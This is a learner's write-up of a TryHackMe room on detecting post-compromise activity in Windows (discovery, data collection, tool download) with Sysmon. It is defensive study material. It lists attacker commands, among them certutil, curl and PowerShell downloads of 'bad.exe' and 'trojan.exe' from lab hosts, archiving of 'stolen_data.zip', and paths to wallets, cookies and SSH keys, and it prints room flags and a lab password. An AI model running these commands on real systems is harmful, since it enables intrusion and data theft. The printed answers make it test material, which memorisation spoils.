# TryHackMe - Windows Threat Detection 2

**Date:** 2026-09-06  
**Room:** Windows Threat Detection 2  
**Platform:** TryHackMe

---

## What this room was about

In this room, I continued from **Windows Threat Detection 1** and focused on what attackers usually do after gaining Initial Access.

The main topics I covered were:

- Discovery
- Detecting Discovery through Sysmon
- Collection
- Detecting Collection
- Ingress Tool Transfer

The main idea was to understand how attackers learn about a compromised system, find valuable information, collect it, and download additional tools.

---

# Task 1 - Introduction

After Initial Access, an attacker normally needs to understand the environment before deciding what to do next.

They may:

- Find out who they are logged in as
- Check available users and privileges
- Inspect files and folders
- Check running processes
- Check installed software
- Check network configuration
- Identify security products such as Microsoft Defender

After Discovery, the attacker may move towards **Collection**, where they search for valuable information.

They may also transfer additional tools to the compromised host.

---

# Task 2 - Discovery Overview

## What is Discovery?

Discovery is the process of learning about the compromised system and its environment.

It is mapped to the MITRE ATT&CK **Discovery** tactic.

An attacker may want to know:

- Who is using the computer?
- What privileges do I have?
- What files are present?
- What software is installed?
- What services are running?
- What network is this machine connected to?
- What security products are installed?

## Common Discovery Commands

### Files and Folders

```cmd
type <file>
dir <folder>
```

```powershell
Get-Content <file>
Get-ChildItem <folder>
```

### Users and Groups

```cmd
whoami
net user
net localgroup
query user
```

```powershell
Get-LocalUser
```

### System and Applications

```cmd
tasklist /v
systeminfo
wmic product get name,version
```

```powershell
Get-Service
```

### Network Settings

```cmd
ipconfig /all
netstat -ano
netsh advfirewall show allprofiles
```

### Antivirus

```powershell
Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"
```

## Practical Discovery

I opened CMD and ran:

```cmd
net user Administrator
```

### Which privileged group does the user belong to?

```text
Administrators
```

I then opened Event Viewer and found the command in the Sysmon logs.

### What is the Image field of the `net` command?

```text
C:\Windows\System32\net.exe
```

---

# Task 3 - Detecting Discovery

## Discovery via CMD

Attackers commonly use built-in Windows commands for discovery because they are already available on the system.

Example process tree:

```text
invoice.pdf.exe
    ↓
cmd.exe
    ├── ipconfig
    ├── whoami /priv
    ├── dir
    ├── net user
    ├── tasklist /v
    └── wmic computersystem get model
```

PowerShell can also be used:

```text
powershell.exe
    ├── Get-Service
    └── Get-MpPreference
```

## Discovery via GUI

Discovery does not always involve CMD or PowerShell.

If an attacker has an interactive session, they can use normal Windows applications.

For example:

```text
explorer.exe
    ├── cmd.exe
    ├── compmgmt.msc
    ├── control.exe netconnections
    ├── SystemSettings.exe
    ├── notepad.exe
    └── taskmgr.exe
```

## Detecting Discovery

The first thing I should look for is a suspicious discovery command or a sequence of discovery commands happening within a short period.

Sysmon Event ID `1` is useful because it records process creation.

I can build a process tree by comparing:

```text
ProcessId
ParentProcessId
```

For example:

```text
explorer.exe
    ↓
invoice.pdf.exe
    ↓
cmd.exe
    ↓
ipconfig
```

This gives context about where the command came from.

## Practice - Discovery

I ran:

```text
C:\Users\Administrator\Desktop\Practice\Task 3\invoice.pdf.exe
```

### What was the first command executed by `invoice.pdf.exe`?

```text
whoami
```

### Which command did the malware use to check for MS Defender EDR?

```cmd
cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"
```

### To which domain did the malware send the discovered data?

```text
exfil.beecz.cafe
```

## Discovery Attack Chain

```text
invoice.pdf.exe
       ↓
whoami
       ↓
System / User Discovery
       ↓
tasklist
       ↓
Check for MS Defender EDR
       ↓
Collect discovered information
       ↓
exfil.beecz.cafe
```

---

# Task 4 - Collection Overview

## What is Collection?

After discovering the environment, attackers may start looking for valuable information.

This stage is known as **Collection**.

Collection can involve:

- Personal documents
- Photos
- Browser history
- Browser cookies
- Saved credentials
- SSH keys
- Databases
- Corporate documents

Collection is closely related to:

- Collection
- Credential Access
- Exfiltration

## Examples of Interesting Files

### Personal Information

```text
C:\Users\<user>\AppData\Roaming\Signal\*
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\History
```

### Credentials / Financial Information

```text
C:\Users\<user>\AppData\Roaming\Bitcoin\wallet.dat
C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies
```

### Corporate Data

```text
C:\Users\<user>\.ssh\*
C:\Program Files\Microsoft SQL Server\...\DATA\*
```

## Exfiltration

After collecting useful information, attackers need to move it outside the compromised system.

They may try to hide this activity by using:

- Cloud storage
- Code repositories
- Messaging platforms
- Normal-looking domains

They may also archive collected data before sending it out.

## Practice - Collection

### Facebook password saved in Chrome

I checked:

```text
Chrome → Passwords and autofill → Password Manager
```

The saved Facebook password was:

```text
nsAghv51BBav90!
```

### Interesting SSH key stored on disk

I searched from:

```text
C:\Users\Administrator\
```

The interesting SSH key was:

```text
thm-access-database.key
```

### Secret PDF containing the internal network information

I searched:

```text
Desktop
Downloads
Documents
```

The file was:

```text
thm-network-diagram-2025.pdf
```

---

# Task 5 - Detecting Collection

Collection can be performed manually by an attacker or automatically by malware.

Examples of commands that can indicate collection:

### Opening a sensitive file

```cmd
notepad.exe C:\Users\<user>\Desktop\finances-2025.csv
```

### Searching for passwords

```cmd
type debug-logs.txt | findstr password > C:\Temp\passwords.txt
```

### Searching for PDFs

```powershell
Get-ChildItem C:\Users\<user> -Recurse -Filter *.pdf
```

### Copying data

```powershell
copy C:\Users\<user>\AppData\Roaming\Signal C:\Temp\
```

### Archiving collected data

```powershell
Compress-Archive C:\Temp\ C:\Temp\stolen_data.zip
```

Or:

```cmd
7za.exe a -tzip C:\Temp\stolen_data.zip C:\Temp\*.*
```

## Data Stealers

A **data stealer** is malware designed to automatically search for and steal valuable information.

It can collect things such as:

- Browser sessions
- Passwords
- Cryptocurrency wallets
- VPN profiles
- Discord data
- Telegram data
- Steam data
- Screenshots

This can make detection harder because the malware can access files directly without launching obvious discovery commands.

## Practice - Data Stealer

I ran:

```text
C:\Users\Administrator\Desktop\Practice\Task 5\stealer.exe
```

### What directory does the stealer create?

```text
staging_58f1
```

### Which three file extensions does the malware search for?

```text
docx, pdf, xlsx
```

### Which PowerShell cmdlet does the malware use to get clipboard content?

```powershell
Get-Clipboard
```

### Which domain does the malware exfiltrate the data to?

```text
collecteddata-storage-2025.s3.amazonaws.com
```

## Attack Chain

```text
stealer.exe
      ↓
Creates staging_58f1
      ↓
Searches for:
.docx
.pdf
.xlsx
      ↓
Gets clipboard content
      ↓
Stages collected information
      ↓
Exfiltrates data
      ↓
collecteddata-storage-2025.s3.amazonaws.com
```

---

# Task 6 - Ingress Tool Transfer

## What is Ingress Tool Transfer?

After gaining access to a system, an attacker may not have all the tools they need.

They can download additional tools or malware to the compromised host.

This is called **Ingress Tool Transfer** and is mapped to:

```text
MITRE ATT&CK T1105
```

Examples include:

- Discovery tools
- Credential dumping tools
- RATs
- Malware
- Ransomware

## Common Transfer Methods

### Certutil

```cmd
certutil.exe -urlcache -f https://blackhat.thm/bad.exe good.exe
```

### Curl

```cmd
curl.exe https://blackhat.thm/bad.exe -o good.exe
```

### PowerShell

```powershell
powershell -c "Invoke-WebRequest -Uri 'https://blackhat.thm/bad.exe' -OutFile 'good.exe'"
```

### Graphical Interface

An attacker can also use:

- Web browsers
- RDP
- Copy/paste
- Other graphical methods

## Detecting Tool Transfer

A transfer normally involves a network connection.

Useful questions to investigate are:

- Which process made the connection?
- Which domain/IP did it connect to?
- Which file was downloaded?
- Where was the file saved?
- Was the downloaded file executed afterwards?

Example:

```text
cmd.exe
   ↓
curl.exe
   ↓
Network Connection
   ↓
Malicious Domain
   ↓
Downloaded File
   ↓
Execution
```

## Practice - Browser Download

I opened:

```text
http://appsforfree.thm/trojan.exe
```

in Chrome.

### Flag

```text
THM{just_use_web_browser}
```

## Practice - curl

I used:

```cmd
curl.exe http://appsforfree.thm/trojan.exe
```

### Flag

```text
THM{curl_is_cool}
```

## Practice - certutil

I used:

```cmd
certutil.exe -urlcache -split -f http://appsforfree.thm/trojan.exe trojan.exe
```

The file downloaded successfully, but the flag was not shown directly in the CMD output during my attempt.

### Flag

```text
THM{abusing_certutil}
```

## Practice - PowerShell IWR

I used:

```powershell
iwr http://appsforfree.thm/trojan.exe
```

### Flag

```text
THM{power_of_powershell}
```

---

# Quick Comparison - Tool Transfer

| Method | What I typed | Result |
|---|---|---|
| **Web Browser** | Opened URL in Chrome | `THM{just_use_web_browser}` |
| **curl** | `curl.exe URL` | `THM{curl_is_cool}` |
| **certutil** | `certutil.exe -urlcache ...` | `THM{abusing_certutil}` |
| **PowerShell IWR** | `iwr URL` | `THM{power_of_powershell}` |

---

# Important Things I Learned

## 1. Discovery is about understanding the environment

Attackers commonly use built-in commands such as:

```text
whoami
net user
ipconfig
tasklist
systeminfo
```

These commands are not malicious by themselves.

The important part is the context.

For example:

```text
Normal user → ipconfig
```

may be completely normal.

But:

```text
phishing malware
      ↓
cmd.exe
      ↓
whoami
      ↓
net user
      ↓
tasklist
      ↓
Defender check
```

is much more suspicious.

---

## 2. Process trees are extremely useful

Sysmon Event ID `1` allows me to correlate:

```text
ProcessId
ParentProcessId
```

This helps answer:

**Who launched this process?**

For example:

```text
explorer.exe
    ↓
invoice.pdf.exe
    ↓
cmd.exe
    ↓
ipconfig.exe
```

This gives much more context than looking at `ipconfig.exe` alone.

---

## 3. Collection is different from Discovery

I understood the difference as:

**Discovery:**

```text
"What is on this system?"
```

**Collection:**

```text
"What valuable information can I take from this system?"
```

Example:

```text
Discovery → Find PDF files
Collection → Open/copy the interesting PDF
```

---

## 4. Attackers may use legitimate tools

Tools such as:

```text
curl
certutil
PowerShell
7-Zip
```

are legitimate tools.

Their presence alone does not mean malware is running.

The important things to check are:

- Parent process
- Command line
- Destination
- Downloaded file
- User
- Timing
- What happened afterwards

---

## 5. Correlation is the key

A suspicious command by itself may not be enough.

Several related events can reveal the attack:

```text
Initial Access
      ↓
Discovery
      ↓
Collection
      ↓
Tool Transfer
      ↓
Exfiltration
```

This is why I need to think about the whole timeline instead of investigating individual events in isolation.

---

# Useful MITRE Techniques

| Technique | ID | Meaning |
|---|---|---|
| **Exploit Public-Facing Application** | T1190 | Exploiting an exposed/vulnerable service |
| **Phishing** | T1566 | Using phishing to gain access |
| **Replication Through Removable Media** | T1091 | Spreading through removable media |
| **Ingress Tool Transfer** | T1105 | Downloading tools/files to a compromised system |

---

# My Main Takeaway

This room helped me understand what happens **after Initial Access**.

The attacker usually needs to:

```text
Gain Access
     ↓
Discover the Environment
     ↓
Find Valuable Information
     ↓
Collect the Data
     ↓
Transfer Additional Tools
     ↓
Exfiltrate / Continue the Attack
```

For SOC analysis, I should focus on the relationships between events.

A command such as `whoami`, `ipconfig`, or `curl` is not automatically malicious. What matters is **who launched it, why it was launched, what it accessed, where it connected, and what happened afterwards**.

That context is what turns individual Windows logs into an actual attack story.
